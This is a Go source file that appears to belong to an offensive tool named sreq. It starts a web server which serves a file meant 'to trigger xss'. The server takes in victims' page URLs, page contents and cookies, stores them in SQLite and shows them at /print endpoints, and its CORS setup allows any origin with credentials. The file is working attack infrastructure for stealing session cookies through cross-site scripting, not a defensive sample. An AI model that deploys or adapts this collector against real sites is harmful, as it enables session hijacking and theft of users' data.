package serverhttp

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"log"
	"math/big"
	"net/http"
	"os"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"github.com/kr/pretty"
	"github.com/nxczje/sreq/feature/serverhttp/db"
)

// Start server and use filejs to trigger xss
func Run(file string, https bool) {
	// If certificates don't exist, generate them
	if https {
		_, certErr := os.Stat("cert.pem")
		_, keyErr := os.Stat("key.pem")
		if os.IsNotExist(certErr) || os.IsNotExist(keyErr) {
			if err := generateCertificates(); err != nil {
				log.Fatalf("Failed to generate certificates: %v", err)
			}
		}
	}

	pretty.Println("[+] Wait for setup server")
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	config := cors.DefaultConfig()
	config.AllowAllOrigins = true
	config.AllowCredentials = true
	config.AddAllowHeaders("Content-Type")
	r.Use(cors.New(config))
	database, err := db.CreateConnection("sqlite.db")
	if err != nil {
		log.Fatalf("[-] Error creating database: %v", err)
	}
	defer database.Close()

	err = db.CreateDB(database)
	if err != nil {
		log.Fatalf("[-] Error creating database: %v", err)
	}
	//handle to save data
	r.POST("/content", func(c *gin.Context) {
		url := c.PostForm("url")
		content := c.PostForm("content")
		cookie := c.PostForm("cookie")
		_, err := db.InsertContent(database, url, content, cookie)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		pretty.Printf("[+] Received Page: %s\n", url)
		c.JSON(http.StatusOK, gin.H{})
	})
	//file to trigger xss
	if file != "index.html" {
		r.GET(pretty.Sprintf(`/%s`, file), func(c *gin.Context) {
			c.File(file)
		})
	} else {
		r.GET("/", func(c *gin.Context) {
			c.String(http.StatusOK, file)
		})
	}

	r.GET("/print/content", func(c *gin.Context) {
		location := c.Query("location")
		content, cookie, err := db.GetContent(database, location)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		data := pretty.Sprintf(`
		Cookie : %s
		----------------------------
		Content: %s
		`, cookie, content)
		c.String(http.StatusOK, data)
	})

	r.GET("/print/locations", func(c *gin.Context) {
		locations, err := db.GetLocations(database)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"locations": locations})
	})

	if https {
		pretty.Println("[+] Server started on 0.0.0.0:443")
		err = r.RunTLS(":443", "cert.pem", "key.pem")
		if err != nil {
			log.Fatalf("[-] Failed to start server: %v", err)
		}
	} else {
		pretty.Println("[+] Server started on 0.0.0.0:80")
		err = r.Run(":80")
		if err != nil {
			log.Fatalf("[-] Failed to start server: %v", err)
		}
	}
}

func generateCertificates() error {
	// Generate RSA private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}

	// Create certificate template
	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"NXCZJE"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0), // Valid for 1 year
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	// Create the certificate
	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return err
	}

	// Write certificate to cert.pem file
	certOut, err := os.Create("cert.pem")
	if err != nil {
		return err
	}
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	certOut.Close()

	// Write private key to key.pem file
	keyOut, err := os.Create("key.pem")
	if err != nil {
		return err
	}
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})
	keyOut.Close()

	return nil
}
